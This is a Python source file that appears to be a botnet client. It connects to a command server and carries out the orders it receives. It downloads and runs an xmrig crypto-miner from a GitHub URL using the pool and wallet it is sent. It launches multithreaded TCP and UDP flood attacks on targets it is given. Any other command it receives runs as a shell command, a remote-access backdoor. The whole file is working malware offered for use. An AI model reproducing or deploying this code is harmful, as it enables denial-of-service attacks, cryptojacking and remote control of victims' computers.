import threading
import requests
import socket
import time
import sys
import os

host = "127.0.0.1"
port = 4444


def client():
    global l7
    try:
        c = socket.socket()
        c.connect((host, port))

        while True:
            data = c.recv(1024).decode()

            if data == "ping":
                c.sendall(b'pong')

            elif data.startswith("miner"):
                data = data.split()

                pool = data[1]
                wallet = data[2]
                worker = data[3]

                data = " ".join(data)

                if sys.platform == "linux":
                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
                    ext = "./"
                    rig = "xmrig"
                else:
                    url = "https://github.com/rxyzqc/SC/raw/main/xmrig.exe"
                    ext = ""
                    rig = "xmrig.exe"

                if not os.path.exists(rig):
                    response = requests.get(url)

                    with open(rig, 'wb') as f:
                        f.write(response.content)

                if os.path.exists(rig):
                    os.popen(f"{ext}{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")

            # L4 TCP
            elif data.startswith("l4 tcp"):
                data = data.split()

                l4_tcp_ip = socket.gethostbyname(data[2])
                l4_tcp_port = int(data[3])
                l4_tcp_threads = int(data[4])

                data = " ".join(data)

                def l4_tcp():
                    try:
                        l4_tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        l4_tcp_sock.connect((l4_tcp_ip, l4_tcp_port))

                        l4_tcp_sock.send(f"GET / HTTP/1.1\r\nHost: {l4_tcp_ip}\r\n\r\n".encode())

                        print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {l4_tcp_ip}:{l4_tcp_port}")

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def l4_tcp_thread():
                    for i in range(l4_tcp_threads):
                        l4_tcp_t = threading.Thread(target=l4_tcp)
                        l4_tcp_t.start()

                t = threading.Thread(target=l4_tcp_thread)
                t.start()

            # L4 UDP
            elif data.startswith("l4 udp"):
                data = data.split()

                l4_udp_ip = socket.gethostbyname(data[2])
                l4_udp_port = int(data[3])
                l4_udp_threads = int(data[4])

                data = " ".join(data)

                l4_udp_address = (l4_udp_ip, l4_udp_port)

                def l4_udp():
                    try:
                        l4_udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                        l4_udp_socket.sendto(f"GET / HTTP/1.1\r\nHost: {l4_udp_ip}\r\n\r\n".encode(), l4_udp_address)

                        if l4_udp_port == 0:
                            print("\033[32m[+]\033[0m L4 UDP Packet sent ->", l4_udp_ip)
                        else:
                            print(f"\033[32m[+]\033[0m L4 UDP Packet sent -> {l4_udp_ip}:{l4_udp_port}")

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def l4_udp_thread():
                    for i in range(l4_udp_threads):
                        l4_udp_t = threading.Thread(target=l4_udp)
                        l4_udp_t.start()

                t = threading.Thread(target=l4_udp_thread)
                t.start()

            # L7 TCP
            elif data.startswith("l7 tcp"):
                data = data.split()

                l7_tcp_ip = data[2]
                l7_tcp_threads = int(data[3])

                data = " ".join(data)

                if l7_tcp_ip.startswith("http://"):
                    l7 = "http://"

                elif l7_tcp_ip.startswith("https://"):
                    l7 = "https://"

                l7_ip = socket.gethostbyname(l7_tcp_ip.replace(l7, ""))

                def l7_tcp():
                    try:
                        requests.get(l7_tcp_ip)

                        print("\033[32m[+]\033[0m L7 TCP Packet sent ->", l7_ip)

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def l7_tcp_thread():
                    for i in range(l7_tcp_threads):
                        l7_tcp_t = threading.Thread(target=l7_tcp)
                        l7_tcp_t.start()

                t = threading.Thread(target=l7_tcp_thread)
                t.start()

            # L7 UDP
            elif data.startswith("l7 udp"):
                data = data.split()

                l7_udp_ip = socket.gethostbyname(data[2])
                l7_udp_port = int(data[3])
                l7_udp_threads = int(data[4])

                data = " ".join(data)

                def l7_udp():
                    try:
                        l7_udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

                        l7_udp_sock.sendto\
                            (f"GET / HTTP/1.1\r\nHost: {l7_udp_ip}\r\n\r\n".encode(), (l7_udp_ip, l7_udp_port))

                        if l7_udp_port == 0:
                            print("\033[32m[+]\033[0m L7 UDP Packet sent ->", l7_udp_ip)
                        else:
                            print(f"\033[32m[+]\033[0m L7 UDP Packet sent -> {l7_udp_ip}:{l7_udp_port}")

                    except Exception as err:
                        print("\033[31m[-]\033[0m", err)

                def l7_udp_thread():
                    for i in range(l7_udp_threads):
                        l7_udp_t = threading.Thread(target=l7_udp)
                        l7_udp_t.start()

                t = threading.Thread(target=l7_udp_thread)
                t.start()

            else:
                os.popen(data)

    except socket.error:
        time.sleep(5)
        client()


client()
